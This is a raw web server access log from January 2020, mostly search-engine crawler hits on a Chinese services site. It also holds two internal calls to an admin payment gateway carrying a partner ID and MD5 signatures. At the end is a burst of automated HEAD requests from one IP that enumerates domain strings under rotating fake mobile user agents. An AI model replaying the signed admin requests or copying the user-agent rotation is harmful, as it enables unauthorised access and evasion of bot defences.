192.168.8.60 - - [15/Jan/2020:11:39:48 +0800] "GET /xye-open/gateWay/systemGateWay.htm?cardType=2&partner=XYE_ADMIN2&query_type=getSystemBankcard&service=op_common_query_service&userId=1&sign=02b05b22fe497a0e30ef55474c6b1fe0&sign_type=md5 HTTP/1.1" 301 178 "-" "Apache-HttpClient/4.5.3 (Java/1.8.0_222)"
192.168.8.60 - - [15/Jan/2020:11:39:48 +0800] "GET /xye-open/gateWay/systemGateWay.htm?partner=XYE_ADMIN2&query_type=selectCiticBillAmount&service=op_common_query_service&sign=8f411707b7112b06c8bdf9f64c20542a&sign_type=md5 HTTP/1.1" 301 178 "-" "Apache-HttpClient/4.5.3 (Java/1.8.0_222)"
49.7.20.144 - - [15/Jan/2020:11:39:56 +0800] "GET /shop/changeLabelDetail?mill=1495837055805&labelId=3 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:40:34 +0800] "GET /shop/changeLabelDetail?mill=1472816637271&labelId=3 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:40:56 +0800] "GET /shop/changeLabelDetail?mill=1506362984460&labelId=2 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
66.249.71.103 - - [15/Jan/2020:11:41:01 +0800] "GET /fw_4412 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
49.7.20.144 - - [15/Jan/2020:11:41:06 +0800] "GET /xq_3219 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:41:31 +0800] "GET /fw_2743 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:41:41 +0800] "GET /fw_2374 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:42:21 +0800] "GET /fw_3731 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:42:39 +0800] "GET /shop/changeLabelDetail?mill=1495345490685&labelId=3 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
42.236.99.178 - - [15/Jan/2020:11:42:41 +0800] "GET /xuqiu HTTP/1.1" 301 178 "http://www.xiaoyuer.com/xuqiu" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
49.7.20.144 - - [15/Jan/2020:11:43:11 +0800] "GET /fuwu_rjkf_h5qd HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
46.229.168.135 - - [15/Jan/2020:11:43:52 +0800] "GET /shop/changeLabelDetail?labelId=3&mill=1508461151126 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
46.229.168.137 - - [15/Jan/2020:11:44:29 +0800] "GET /shop/changeLabelDetail?labelId=1&mill=1508864413317 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
49.7.20.144 - - [15/Jan/2020:11:45:17 +0800] "GET /shop/changeLabelDetail?mill=1490558133590&labelId=2 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
46.229.168.148 - - [15/Jan/2020:11:45:24 +0800] "GET /shop/changeLabelDetail?labelId=3&mill=1516596833333 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
49.7.20.144 - - [15/Jan/2020:11:45:42 +0800] "GET /shop/changeLabelDetail?mill=1471384117235&labelId=2 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:48:13 +0800] "GET /shop/changeLabelDetail?mill=1501838693925&labelId=2 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
46.229.168.141 - - [15/Jan/2020:11:49:01 +0800] "GET /fw_7350 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
49.7.20.144 - - [15/Jan/2020:11:49:33 +0800] "GET /shop/changeLabelDetail?mill=1506236591257&labelId=2 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:49:45 +0800] "GET /shop/changeLabelDetail?mill=1472819999313&labelId=1 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:50:15 +0800] "GET /require/detail/18 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
54.36.150.10 - - [15/Jan/2020:11:51:42 +0800] "GET /xq_4631 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)"
49.7.20.144 - - [15/Jan/2020:11:51:57 +0800] "GET /shop/changeLabelDetail?mill=1501478812813&labelId=1 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:52:17 +0800] "GET /shop/changeLabelDetail?mill=1471433844352&labelId=1 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:52:33 +0800] "GET /shop/changeLabelDetail?mill=1495347589798&labelId=3 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:52:50 +0800] "GET /fuwu_shfw_mrmt HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:53:02 +0800] "GET /shop/changeLabelDetail?mill=1472852277309&labelId=4 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:54:18 +0800] "GET /shop/changeLabelDetail?mill=1506364057312&labelId=2 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
46.229.168.148 - - [15/Jan/2020:11:55:49 +0800] "GET /robots.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
46.229.168.144 - - [15/Jan/2020:11:55:51 +0800] "GET /shop/changeLabelDetail?labelId=2&mill=1519301000413 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
49.7.20.144 - - [15/Jan/2020:11:55:54 +0800] "GET /shop/changeLabelDetail?mill=1506121080233&labelId=1 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:56:40 +0800] "GET /fuwu_ggcb_bj HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:56:49 +0800] "GET /shop/changeLabelDetail?mill=1472405905337&labelId=4 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
46.229.168.144 - - [15/Jan/2020:11:57:01 +0800] "GET /shop/changeLabelDetail?labelId=3&mill=1508870305275 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
49.7.20.144 - - [15/Jan/2020:11:57:02 +0800] "GET /usercenter/phome/comment/service/130977 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:57:13 +0800] "GET /fuwu_xzqg_dbsh HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:57:49 +0800] "GET /fw_3515 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:58:07 +0800] "GET /shop/changeLabelDetail?mill=1495347589819&labelId=3 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:11:58:27 +0800] "GET /fuwu_jypx_kqpx HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
111.231.81.165 - - [15/Jan/2020:11:58:41 +0800] "HEAD /search/f?querystr=www.guizhouymca.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.1.1; zh-cn; MI MAX 2 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.1.3NULL"
111.231.81.165 - - [15/Jan/2020:11:58:42 +0800] "HEAD /search/f?querystr=www.guizhouymcb.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 8.1; COL-AL10 Build/HUAWEICOL-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 T7/10.8 baiduboxapp/10.8.5.10 (Baidu; P1 8.1.0)NULL"
111.231.81.165 - - [15/Jan/2020:11:58:43 +0800] "HEAD /search/f?querystr=www.guizhouymcc.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.1.3NULL"
111.231.81.165 - - [15/Jan/2020:11:58:44 +0800] "HEAD /search/f?querystr=www.guizhouymcd.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.1.1; zh-cn; ONEPLUS A3010 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/8.0 Mobile Safari/537.36NULL"
111.231.81.165 - - [15/Jan/2020:11:58:44 +0800] "HEAD /search/f?querystr=www.guizhouymce.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 7.1.1; TA-1000 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043124 Safari/537.36 MicroMessenger/6.5.7.1041 NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:58:45 +0800] "HEAD /search/f?querystr=www.guizhouymcf.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 4X Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043128 Safari/537.36 V1_AND_SQ_6.7.1_500_YYB_D QQ/6.7.1.3105 NetType/WIFI WebP/0.3.0 Pixel/1080NULL"
111.231.81.165 - - [15/Jan/2020:11:58:45 +0800] "HEAD /search/f?querystr=www.guizhouymcg.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; PE-UL00 Build/HuaweiPE-UL00) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.5.1) WindVane/8.0.0 1080X1776 GCanvas/1.4.2.21NULL"
111.231.81.165 - - [15/Jan/2020:11:58:46 +0800] "HEAD /search/f?querystr=www.jiangxiymca.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 5.1; PRO 5 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.9 TBS/036906 Safari/537.36 MicroMessenger/6.5.3.980 NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:58:46 +0800] "HEAD /search/f?querystr=www.jiangxiymcb.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; vivo Y67A Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.8.8.968 UWS/2.13.1.10 Mobile Safari/537.36 AliApp(TB/7.8.0.18) UCBS/2.11.1.1 TTID/600129@taobao_android_7.8.0.18 WindVane/8.3.0NULL"
111.231.81.165 - - [15/Jan/2020:11:58:47 +0800] "HEAD /search/f?querystr=www.jiangxiymcc.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.0; zh-cn; KNT-AL10 Build/HUAWEIKNT-AL10) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.5.0) WindVane/8.0.0 1080X1806 GCanvas/1.4.2.21NULL"
111.231.81.165 - - [15/Jan/2020:11:58:48 +0800] "HEAD /search/f?querystr=www.jiangxiymcd.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 T7/10.4 baiduboxapp/10.4.5.11 (Baidu; P1 6.0)NULL"
111.231.81.165 - - [15/Jan/2020:11:58:48 +0800] "HEAD /search/f?querystr=www.jiangxiymce.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_2 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B202 baiduboxapp/0_71.0.3.8_enohpi_1002_5211/2.1.11_2C2%259enohPi/1099a/C773022FBD7E74DD145F10CD98885F4E43045A16EOCAJSCFSIG/1NULL"
111.231.81.165 - - [15/Jan/2020:11:58:48 +0800] "HEAD /search/f?querystr=www.jiangxiymcf.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 MicroMessenger/6.5.11 NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:58:49 +0800] "HEAD /search/f?querystr=www.jiangxiymcg.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 MicroMessenger/6.5.16 NetType/4G Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:58:50 +0800] "HEAD /search/f?querystr=www.jiangxiymch.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; vivo X9s Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.0.990 Mobile Safari/537.36NULL"
111.231.81.165 - - [15/Jan/2020:11:58:50 +0800] "HEAD /search/f?querystr=www.hunanymca.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 8.0; PRA-AL00X Build/HONORPRA-AL00X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 T7/10.11 baiduboxapp/10.11.0.12 (Baidu; P1 8.0.0)NULL"
111.231.81.165 - - [15/Jan/2020:11:58:51 +0800] "HEAD /search/f?querystr=www.hunanymcb.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; vivo X9 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.5.908 Mobile Safari/537.36NULL"
111.231.81.165 - - [15/Jan/2020:11:58:52 +0800] "HEAD /search/f?querystr=www.hunanymcc.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 MicroMessenger/6.6.6 NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:58:52 +0800] "HEAD /search/f?querystr=www.hunanymcd.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043909 Mobile Safari/537.36 MicroMessenger/6.6.5.1280(0x26060533) NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:58:53 +0800] "HEAD /search/f?querystr=www.hunanymce.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; vivo X20A Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.8.0.960 UWS/2.12.1.18 Mobile Safari/537.36 AliApp(TB/7.6.1.1) UCBS/2.11.1.1 WindVane/8.3.0 1080X2160NULL"
111.231.81.165 - - [15/Jan/2020:11:58:54 +0800] "HEAD /search/f?querystr=www.hunanymcf.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 7.0; KNT-AL10 Build/HUAWEIKNT-AL10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/35.0.1916.138 Mobile Safari/537.36 T7/7.4 baiduboxapp/8.2.5 (Baidu; P1 7.0)NULL"
111.231.81.165 - - [15/Jan/2020:11:58:54 +0800] "HEAD /search/f?querystr=www.hunanymcg.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 5.1; vivo X6D Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043808 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:58:54 +0800] "HEAD /search/f?querystr=www.hunanymch.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 5.1; OPPO R9m Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043128 Safari/537.36 MicroMessenger/6.5.7.1041 NetType/4G Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:58:55 +0800] "HEAD /search/f?querystr=www.guangxiymca.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043909 Mobile Safari/537.36 MicroMessenger/6.6.5.1280(0x26060532) NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:58:56 +0800] "HEAD /search/f?querystr=www.guangxiymcb.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone 92; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 MQQBrowser/7.9.0 Mobile/14C92 Safari/8536.25 MttCustomUA/2 QBWebViewType/1 WKType/1NULL"
111.231.81.165 - - [15/Jan/2020:11:58:56 +0800] "HEAD /search/f?querystr=www.guangxiymcc.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.1.1; zh-tw; Mi Note 3 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.5.12NULL"
111.231.81.165 - - [15/Jan/2020:11:58:57 +0800] "HEAD /search/f?querystr=www.guangdongymca.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; H60-L11 Build/HDH60-L11) AppleWebKit/534.24 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.24 T5/2.0 baiduboxapp/6.6.1 (Baidu; P1 4.4.2)NULL"
111.231.81.165 - - [15/Jan/2020:11:58:58 +0800] "HEAD /search/f?querystr=www.guangdongymcb.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 baiduboxapp/0_01.5.2.8_enohpi_4331_057/1.2.01_1C2%259enohPi/1099a/C663C017B6228E60FDDAA29F48EE2E315D7F02DC2OCTKETJCCH/1NULL"
111.231.81.165 - - [15/Jan/2020:11:58:58 +0800] "HEAD /search/f?querystr=www.guangdongymcc.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.9 TBS/036906 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:58:59 +0800] "HEAD /search/f?querystr=www.guangdongymcd.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; OPPO R9sk Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/044106 Mobile Safari/537.36 MicroMessenger/6.6.6.1300(0x26060638) NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:59:00 +0800] "HEAD /search/f?querystr=www.guangdongymce.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 6.0; M5 Note Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043409 Safari/537.36 MicroMessenger/6.5.13.1100 NetType/4G Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:59:01 +0800] "HEAD /search/f?querystr=www.guangdongymcf.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; OPPO A59s Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.8.0.960 UWS/2.12.1.18 Mobile Safari/537.36 AliApp(TB/7.5.4) UCBS/2.11.1.1 WindVane/8.3.0 720X1280NULL"
111.231.81.165 - - [15/Jan/2020:11:59:01 +0800] "HEAD /search/f?querystr=www.guangdongymcg.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; HUAWEI NXT-TL00 Build/HUAWEINXT-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.5.937 Mobile Safari/537.36NULL"
111.231.81.165 - - [15/Jan/2020:11:59:02 +0800] "HEAD /search/f?querystr=www.guangdongymch.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; MI 5s Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/044033 Mobile Safari/537.36 MicroMessenger/6.6.3.1260(0x26060339) NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:59:03 +0800] "HEAD /search/f?querystr=www.guangdongymci.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 5.1; m1 note Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 T7/9.2 baiduboxapp/9.2.0.10 (Baidu; P1 5.1)NULL"
111.231.81.165 - - [15/Jan/2020:11:59:03 +0800] "HEAD /search/f?querystr=www.guangdongymcj.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; NX549J Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.5.1) WindVane/8.0.0 1080X1920 GCanvas/1.4.2.21NULL"
111.231.81.165 - - [15/Jan/2020:11:59:04 +0800] "HEAD /search/f?querystr=www.guangdongymck.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.0 MQQBrowser/8.4.2 Mobile/14F89 Safari/602.1 MttCustomUA/2 QBWebViewType/1 WKType/1NULL"
111.231.81.165 - - [15/Jan/2020:11:59:05 +0800] "HEAD /search/f?querystr=www.guangdongymcl.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 baiduboxapp/0_01.5.2.8_enohpi_4331_057/1.2.01_1C2%259enohPi/1099a/C663C017B6228E60FDDAA29F48EE2E315D7F02DC2OCTKETJCCH/1NULL"
111.231.81.165 - - [15/Jan/2020:11:59:05 +0800] "HEAD /search/f?querystr=www.guangdongymcn.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; MI NOTE LTE Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0.3NULL"
111.231.81.165 - - [15/Jan/2020:11:59:06 +0800] "HEAD /search/f?querystr=www.xianggangymc.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; M2 E Build/MMB29U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/044113 Mobile Safari/537.36 V1_AND_SQ_7.7.0_882_YYB_D QQ/7.7.0.3640 NetType/4G WebP/0.3.0 Pixel/1080NULL"
111.231.81.165 - - [15/Jan/2020:11:59:07 +0800] "HEAD /search/f?querystr=guangdongymcm.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.1.2; zh-cn; Redmi Note 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.5.5NULL"
111.231.81.165 - - [15/Jan/2020:11:59:07 +0800] "HEAD /search/f?querystr=guangdongymco.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; KIW-CL00 Build/HONORKIW-CL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043670 Safari/537.36 MicroMessenger/6.5.7.1041 NetType/4G Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:59:08 +0800] "HEAD /search/f?querystr=guangdongymcp.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_0 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13A342 MicroMessenger/6.5.12 NetType/4G Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:59:09 +0800] "HEAD /search/f?querystr=guangdongymcq.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.6.2 NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:59:10 +0800] "HEAD /search/f?querystr=guangdongymcr.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.8.0.960 UWS/2.12.1.18 Mobile Safari/537.36 AliApp(TB/7.6.1) UCBS/2.11.1.1 WindVane/8.3.0 1080X1920NULL"
